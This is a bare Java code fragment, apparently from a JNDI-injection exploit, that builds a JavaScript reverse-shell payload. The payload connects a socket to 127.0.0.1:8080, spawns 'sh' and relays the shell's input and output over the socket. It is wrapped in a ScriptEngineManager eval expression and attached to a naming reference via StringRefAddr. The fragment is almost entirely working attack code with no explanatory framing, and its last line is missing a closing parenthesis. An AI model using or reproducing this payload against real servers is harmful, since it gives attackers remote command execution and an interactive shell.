String command = "var host = '127.0.0.1';" +
                       "var port = 8080;" +
                       "var cmd = 'sh';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x);